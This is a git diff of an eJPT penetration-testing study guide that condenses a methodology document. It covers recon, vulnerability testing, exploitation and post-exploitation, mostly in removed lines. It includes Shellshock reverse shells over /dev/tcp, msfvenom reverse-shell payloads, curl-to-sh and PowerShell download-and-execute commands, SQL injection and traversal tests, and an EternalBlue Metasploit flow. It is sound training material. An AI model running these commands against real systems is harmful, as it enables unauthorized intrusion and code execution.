@@ -1,7 +1,7 @@
 ---
-title: "eJPT Methodology - Complete Penetration Testing Framework"
+title: "eJPT Study Guide - Full Penetration Testing Framework"
 topic: "eJPT Methodology"
-exam_objective: "Complete framework covering all eJPT testing phases"
+exam_objective: "Comprehensive framework covering all eJPT testing phases with practical labs"
 difficulty: "Medium"
 tools:
   - "nmap"
@@ -13,13 +13,11 @@ related_labs:
   - "networking-fundamentals.md"
   - "linux-essentials.md"
   - "information-gathering-basics.md"
-file_path: "01-theory-foundations/ejpt-methodology.md"
+file_path: "01-theory-foundations/ejpt-study-guide.md"
 author: "Sarah Ashour"
-version: "2.2"
-last_updated: "2025-01-19"
-last_reviewed: "2025-10-03"
+version: "3.0"
+last_updated: "2025-10-03"
 license: "Educational Use Only"
-maintainer_contact: "sarah@example.com"
 tags:
   - "methodology"
   - "framework"
@@ -27,424 +25,366 @@ tags:
   - "ejpt"
 ---
 
-# eJPT Methodology — Complete Penetration Testing Framework
+# 🎯 eJPT Study Guide - Full Penetration Testing Framework
 
-This guide shows a clear, practical process for penetration testing. It is written in simple English. It keeps the full content you need for studying and the eJPT practical exam. Commands stay the same; explanations are short and easy to read.
+**This guide is a full and simple study resource for the eJPT exam.**  
+It contains all steps, commands, labs, and tips in **easy English**.
 
-**Location:** `01-theory-foundations/ejpt-methodology.md`
+**📍 File Location:** `01-theory-foundations/ejpt-study-guide.md`
 
 ---
 
-## Table of Contents
-- [What is the eJPT Methodology?](#what-is-the-ejpt-methodology)
-- [The 5 Testing Phases](#the-5-testing-phases)
-- [Phase 1 — Information Gathering](#phase-1---information-gathering)
-- [Phase 2 — Assessment & Vulnerability Analysis](#phase-2---assessment--vulnerability-analysis)
-- [Phase 3 — Exploitation](#phase-3---exploitation)
-- [Phase 4 — Post-Exploitation](#phase-4---post-exploitation)
-- [Phase 5 — Reporting & Documentation](#phase-5---reporting--documentation)
-- [eJPT Exam Success Guide](#ejpt-exam-success-guide)
+## 📑 Table of Contents
+- [Introduction](#introduction)
+- [The 5 Phases of Testing](#the-5-phases-of-testing)
+- [Phase 1: Information Gathering](#phase-1-information-gathering)
+- [Phase 2: Assessment & Vulnerability Analysis](#phase-2-assessment--vulnerability-analysis)
+- [Phase 3: Exploitation](#phase-3-exploitation)
+- [Phase 4: Post-Exploitation](#phase-4-post-exploitation)
+- [Phase 5: Reporting](#phase-5-reporting)
+- [Exam Success Guide](#exam-success-guide)
 - [Complete Lab Example](#complete-lab-example)
-- [Common Problems and Solutions](#common-problems-and-solutions)
+- [Common Problems](#common-problems)
 - [Quick Reference](#quick-reference)
-- [Cheat Sheet (One Page)](#cheat-sheet-one-page)
+- [Integration with Tools](#integration-with-tools)
+- [Documentation Templates](#documentation-templates)
+- [Learning Resources](#learning-resources)
+- [Study Schedule](#study-schedule)
+- [Emergency Help](#emergency-help)
+- [Final Tips](#final-tips)
+- [Cheat Sheet](#cheat-sheet)
 - [Evidence Naming Template](#evidence-naming-template)
-- [Next Steps Checklist](#next-steps-checklist)
+- [Checklist](#checklist)
 - [Changelog](#changelog)
 
 ---
 
-## What is the eJPT Methodology?
+## Introduction
 
-The eJPT methodology is a simple 5-step process for penetration testing. The exam tests hands-on skills in a lab. This guide helps you work quickly and collect good evidence. Follow the steps in order to avoid missing important things.
+The **eJPT (eLearnSecurity Junior Penetration Tester)** exam is practical.  
+You must follow a **clear step-by-step process**.  
+This guide is your roadmap.
 
----
-
-## The 5 Testing Phases
-
-| Phase | Name | What you do |
-|-------|------|-------------|
-| 1 | Information Gathering | Find live hosts, ports, and services |
-| 2 | Assessment | Find and verify vulnerabilities |
-| 3 | Exploitation | Get access and run shells |
-| 4 | Post-Exploitation | Escalate privileges and collect data |
-| 5 | Reporting | Save evidence and write the report |
-
-### Tools setup (quick)
-```
-which nmap && echo "nmap: OK" || echo "nmap: MISSING"
-which metasploit-framework && echo "msf: OK" || echo "msf: MISSING"
-which dirb && echo "dirb: OK" || echo "dirb: MISSING"
-which enum4linux && echo "enum4linux: OK" || echo "enum4linux: MISSING"
-
-sudo updatedb
-sudo msfdb init
-```
+Why use this guide?
+- Clear steps to follow
+- Practical examples
+- Easy commands to copy
+- Includes exam tips
+- Good for labs and practice
 
 ---
 
-## Phase 1 — Information Gathering
+## The 5 Phases of Testing
 
-**Goals:** find live systems, open ports, and running services. Make a list of targets.
+| Phase | Goal | % of Time | % of Exam |
+|-------|------|-----------|-----------|
+| 1️⃣ Info Gathering | Find hosts, ports, services | 20-30% | 20% |
+| 2️⃣ Assessment | Find vulnerabilities | 15-25% | 25% |
+| 3️⃣ Exploitation | Break in, get access | 35-45% | 35% |
+| 4️⃣ Post-Exploitation | Escalate, explore | 10-20% | 15% |
+| 5️⃣ Reporting | Document results | 5-10% | 5% |
 
-### Step 1 — Network discovery
-Use ping scan or ARP scans to find live hosts.
+Essential Tools:
+```bash
+which nmap
+which msfconsole
+which dirb
+which enum4linux
 ```
+
+---
+
+## Phase 1: Information Gathering
+
+Goals:
+1. Find live hosts
+2. Scan for open ports
+3. Identify services and versions
+4. Build target profile
+
+### Steps
+
+**Host Discovery**
+```bash
 nmap -sn 192.168.1.0/24
-# If ping is blocked:
-nmap -Pn 192.168.1.0/24
 arp-scan -l
-masscan -p1-1000 192.168.1.0/24 --rate=1000
+netdiscover -r 192.168.1.0/24
 ```
 
-### Step 2 — Port scanning
-Find open ports and services.
-```
-nmap -F 10.10.10.5           # fast scan of common ports
-nmap -p- 10.10.10.5         # scan all ports
-nmap -sV -p 22,80,135,445 10.10.10.5  # service version detection
-```
-
-### Step 3 — Service enumeration
-Gather more information about services.
-```
-whatweb http://10.10.10.5
-dirb http://10.10.10.5 /usr/share/dirb/wordlists/common.txt
-nikto -h http://10.10.10.5
-
-enum4linux 10.10.10.5
-smbclient -L \\10.10.10.5
-nmap --script smb-enum* 10.10.10.5
-
-nmap --script ssh-enum* 10.10.10.5
+**Port Scanning**
+```bash
+nmap -F target_ip
+nmap -p- target_ip
+nmap -sV -p 22,80,445 target_ip
 ```
 
-### Phase 1 Deliverables
-Save these in a file or folder:
-- List of live hosts and IPs
-- Port scan outputs (nmap)
-- Service details and versions
-- Web directories found
-- SMB shares and permissions
+**Service Enumeration**
+```bash
+whatweb http://target
+dirb http://target
+nikto -h http://target
+enum4linux target
+```
+
+Deliverables:
+- List of hosts
+- Open ports
+- Service details
 
 ---
 
-## Phase 2 — Assessment & Vulnerability Analysis
+## Phase 2: Assessment & Vulnerability Analysis
 
-**Goals:** find weaknesses, check impact, and choose good targets to exploit.
+Goals:
+- Find weaknesses
+- Rate risks
+- Research exploits
 
-### Automated scanning
-Use scripts and scanners for quick checks.
-```
-nmap --script vuln 10.10.10.5
-nmap --script=smb-vuln* 10.10.10.5
-nmap --script=http-vuln* 10.10.10.5
-nikto -h http://10.10.10.5
-```
+### Steps
 
-### Manual testing
-Try simple manual tests to confirm issues.
-```
-curl "http://10.10.10.5/index.php?page=../../../etc/passwd"  # directory traversal test
-curl "http://10.10.10.5/login.php?id=1' OR '1'='1"         # quick SQL test
-curl "http://10.10.10.5/ping.php?host=127.0.0.1;id"        # command injection test
+**Automated Scans**
+```bash
+nmap --script vuln target
+nmap --script=smb-vuln* target
 ```
 
-### Exploit research
-Look for public exploits or Metasploit modules.
+**Manual Tests**
+```bash
+curl "http://target/index.php?page=../../etc/passwd"
+curl "http://target/login.php?id=1' OR '1'='1"
 ```
-searchsploit apache 2.4.41
+
+**Exploit Research**
+```bash
+searchsploit apache
 searchsploit ms17-010
-
-# Metasploit
-msfconsole -q -x "search ms17-010"
 ```
 
-### Risk table (example)
-| Vulnerability | Score | Priority |
-|---------------|-------|----------|
-| EternalBlue | 9.3 | P1 |
-| Shellshock | 10.0 | P1 |
-| Directory Traversal | 7.5 | P2 |
-| Weak SSH Keys | 5.3 | P3 |
-
-Save your notes and pick which targets to exploit next.
+Risk Example:
+| Vuln | Impact | Priority |
+|------|--------|----------|
+| MS17-010 | Critical | P1 |
+| Shellshock | Critical | P1 |
+| Dir Traversal | High | P2 |
 
 ---
 
-## Phase 3 — Exploitation
+## Phase 3: Exploitation
 
-**Goals:** gain access, get a shell, and keep it stable.
+Goals:
+- Get access
+- Establish shell
+- Confirm success
 
-### Metasploit (common flow)
-```
-msfconsole -q
+**Metasploit**
+```bash
+msfconsole
 use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS 10.10.10.15
-set LHOST 10.10.14.5
-set payload windows/x64/meterpreter/reverse_tcp
+set RHOSTS target
+set LHOST attacker
 exploit
-# meterpreter > getuid
 ```
 
-### Manual exploitation (examples)
-Shellshock example:
-```
-curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'id'" http://10.10.10.5/cgi-bin/test.cgi
-# reverse shell
-nc -nlvp 4444 &
-curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'" http://10.10.10.5/cgi-bin/test.cgi
+**Manual**
+```bash
+curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'id'" http://target/cgi-bin/test.cgi
 ```
 
-### Improve your shell
-Turn a basic shell into an interactive shell.
-```
-python -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
-stty raw -echo; fg
-```
-
-### Create payloads and transfer files
-```
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=5555 -f elf > shell
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=6666 -f exe > meter.exe
-
-# Serve files from attacker machine
-python3 -m http.server 8080
-# On target: wget http://10.10.14.5:8080/shell
+**Payloads**
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=ip LPORT=5555 -f elf > shell.elf
 ```
 
 ---
 
-## Phase 4 — Post-Exploitation
+## Phase 4: Post-Exploitation
 
-**Goals:** get higher privileges, collect data, and move to other systems if useful.
+Goals:
+- Escalate privileges
+- Explore system
+- Move laterally
 
-### Linux privilege escalation
-Check system info and find weak points.
-```
-uname -a
-cat /etc/issue
-ps aux
-netstat -antup
-
-find / -perm -4000 2>/dev/null      # SUID files
-sudo -l                             # check sudo rights
-# Automated script (optional)
-curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+**Linux**
+```bash
+sudo -l
+find / -perm -4000 2>/dev/null
 ```
 
-If sudo allows a program with no password, use it to get root:
-```
-# example when /usr/bin/python is allowed
-sudo python -c 'import os; os.system("/bin/bash")'
-```
-
-### Windows privilege escalation and data collection
-```
-systeminfo
+**Windows**
+```powershell
 whoami /all
 net user
-net localgroup administrators
-
-# Check services and saved files
-sc query
-dir C:/Users/Administrator/Documents
+systeminfo
 ```
 
-Use PowerUp or similar checks for quick hints:
+**Data**
+```bash
+cat /etc/passwd
+dir C:\Users\
 ```
-powershell -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"
-```
-
-### Lateral movement
-From a compromised host, scan the internal network and check routes:
-```
-arp -a
-netstat -rn
-ip route show
-nmap -sn 192.168.100.0/24
-nmap -p 22,135,445,3389 192.168.100.1-50
-```
-
-Save all important files and screenshots.
 
 ---
 
-## Phase 5 — Reporting & Documentation
+## Phase 5: Reporting
 
-**Goals:** collect evidence, write clear findings, and give fixes.
+Steps:
+- Collect evidence
+- Write findings
+- Provide solutions
 
-### Organize evidence
-Make a clear folder structure and save outputs and screenshots.
+Folder setup:
+```bash
+mkdir -p evidence/{recon,vulns,exploits,post}
 ```
-mkdir -p ejpt_evidence/{recon,vulns,exploits,post_exploit}
-mkdir -p ejpt_evidence/screenshots/{phase1,phase2,phase3,phase4}
-history > ejpt_evidence/command_history.txt
-echo "eJPT Assessment Summary - $(date)" > ejpt_evidence/summary.txt
-```
-
-### Report template (simple)
-Include an executive summary, key findings, and recommendations.
-
-````markdown
-# Penetration Testing Report - Short Template
-
-## Executive Summary
-- Target: 10.10.10.0/24
-- Timeframe: [dates]
-- Critical issues found: X
-- Systems fully compromised: Y
-
-## Key Findings
-1. Vulnerability name — affected host — short impact
-2. Steps to reproduce
-3. Evidence (screenshots / files)
-
-## Recommendations
-- Immediate steps to fix critical issues
-- Short-term fixes (1 month)
-- Long-term improvements (network segmentation, patch policy)
-````
-
-Be concise in the report and attach evidence files.
 
 ---
 
-## eJPT Exam Success Guide
+## Exam Success Guide
 
-### Exam facts
-- Duration: 72 hours
-- Format: hands-on lab + multiple-choice questions
-- Passing: ~70%
-- You must show proof of work (screenshots, outputs, files)
+- 72 hours total
+- 35 questions
+- Passing: 70%
+- All hands-on
 
-### What to practice
-- Fast host discovery and nmap scans
-- Web directory finding (dirb/gobuster)
-- SMB enumeration (enum4linux)
-- Basic exploit usage (Metasploit and manual)
-
-### Time plan for the 72 hours
-- Day 1: discovery and assessment
-- Day 2: exploitation and post-exploitation
-- Day 3: finish evidence and answer questions
-
-Keep simple log notes as you work.
+Tips:
+- Take screenshots
+- Save all commands
+- Document as you go
+- Take breaks
 
 ---
 
-## Complete Lab Example (short)
+## Complete Lab Example
 
-**Target network:** 10.10.10.0/24 — practice scenario.
+Network: `10.10.10.0/24`  
+Targets: 4 systems
 
-1. Discover hosts:
-```
-nmap -sn 10.10.10.0/24
-```
-
-2. Scan a host:
-```
-nmap -sC -sV -p- 10.10.10.5
-```
-
-3. Web enumeration:
-```
-dirb http://10.10.10.5 /usr/share/wordlists/dirb/common.txt
-```
-
-4. SMB info:
-```
-enum4linux 10.10.10.15
-```
-
-5. If shellshock found, test and get shell:
-```
-curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'id'" http://10.10.10.5/cgi-bin/test.cgi
-nc -nlvp 4444 &
-curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'" http://10.10.10.5/cgi-bin/test.cgi
-```
-
-6. If EternalBlue found, use Metasploit as shown earlier.
+Findings:
+- Web server vulnerable to Shellshock
+- File server vulnerable to MS17-010
+- Both compromised
 
 ---
 
-## Common Problems and Solutions (quick)
+## Common Problems
 
-- **Nmap shows no hosts:** try `-Pn` or ARP scan.
-- **Exploit fails:** check if target is actually vulnerable, try different payloads, check architecture.
-- **File uploads do not execute:** test different file types (php/asp/jsp) and paths.
-- **Shell unstable:** upgrade shell with `python -c 'import pty; pty.spawn("/bin/bash")'` and use `export TERM=xterm`.
+- Nmap not finding hosts → use `-Pn` or arp-scan  
+- Exploit fails → confirm vuln first  
+- Web shell fails → try other extensions  
+- Shell drops → upgrade with `pty.spawn`
 
 ---
 
 ## Quick Reference
 
-Useful commands grouped by phase:
-
-```
-# Phase 1
-nmap -sn 192.168.1.0/24
-nmap -sC -sV -p- target_ip
-
-# Phase 2
-nmap --script vuln target_ip
-searchsploit service version
-
-# Phase 3
+```bash
+nmap -sn subnet
+nmap -sC -sV -p- target
+dirb http://target
+enum4linux target
 msfconsole
-msfvenom -p payload LHOST=ip LPORT=port -f format
-
-# Phase 4
-sudo -l
-find / -perm -4000 2>/dev/null
-
-# Phase 5
-mkdir ejpt_evidence
-history > commands.txt
 ```
 
 ---
 
-## Cheat Sheet (One Page)
-- Host discovery: `nmap -sn 10.10.10.0/24`
-- Full scan: `nmap -sC -sV -p- target_ip`
-- Web scan: `gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
-- SMB: `enum4linux target_ip`
-- Vuln scan: `nmap --script vuln target_ip`
-- Metasploit: `msfconsole; use <module>; set RHOSTS <ip>; exploit`
-- Upgrade shell: `python -c 'import pty; pty.spawn("/bin/bash")'`
-- File transfer: `python3 -m http.server 8080` then `wget http://attacker/file`
+## Integration with Tools
+
+- Combine masscan + nmap
+- Chain gobuster + nikto
+- Use linpeas for Linux
+- Use PowerUp for Windows
+
+---
+
+## Documentation Templates
+
+Quick Findings:
+```markdown
+## Critical Finding
+- Vuln: MS17-010
+- Host: 10.10.10.15
+- Access: SYSTEM
+```
+
+---
+
+## Learning Resources
+
+- INE PTS Course
+- TryHackMe
+- HackTheBox
+- DVWA
+
+---
+
+## Study Schedule
+
+**8 Weeks**
+
+Weeks 1-2: Basics  
+Weeks 3-4: Info gathering  
+Weeks 5-6: Exploitation  
+Weeks 7-8: Practice labs + docs
+
+Daily: 60-90 mins
+
+---
+
+## Emergency Help
+
+- Update tools
+- Ping + traceroute
+- Check logs
+- Use forums / Discord
+
+---
+
+## Final Tips
+
+- Be calm
+- Follow steps
+- Document everything
+- Sleep during exam
+
+---
+
+## Cheat Sheet
+
+```bash
+nmap -sn subnet
+nmap -sC -sV target
+dirb http://target
+enum4linux target
+msfconsole
+```
 
 ---
 
 ## Evidence Naming Template
-Use clear names for evidence files:
+
 ```
 evidence/
-  phase1_recon/
-    10.10.10.5_nmap.txt
-  phase2_vulns/
-    10.10.10.5_vuln_scan.txt
-  phase3_exploit/
-    10.10.10.15_ms17-010_meterpreter.png
-  phase4_postexploit/
-    10.10.10.5_root_shell.png
-  phase5_report/
-    summary.txt
+├── recon/10.10.10.5_nmap.txt
+├── vulns/10.10.10.5_vuln.txt
+├── exploit/10.10.10.15_ms17-010.png
+├── post/10.10.10.5_root.png
 ```
 
 ---
 
-## Next Steps Checklist
-- [ ] Read the cheat sheet
-- [ ] Make evidence folders before exam
-- [ ] Practice one full lab in 8 hours
-- [ ] Convert this file to PDF for GoodNotes (optional)
-- [ ] Review commands and notes daily until exam
+## Checklist
+
+- [ ] Hosts found
+- [ ] Ports scanned
+- [ ] Services identified
+- [ ] Vulns confirmed
+- [ ] Exploits tested
+- [ ] Evidence saved
+- [ ] Report written
 
 ---
 
 ## Changelog
-- v2.2 (2025-10-03): Converted to simple English, added Cheat Sheet, Evidence Template, TOC, and Next Steps.
-- v2.1 (2025-01-19): Initial full document.
+- v3.0 (2025-10-03) — Full study guide, simplified English
+- v2.2 (2025-01-19) — Methodology expanded
+- v2.1 (2025-01-15) — First release
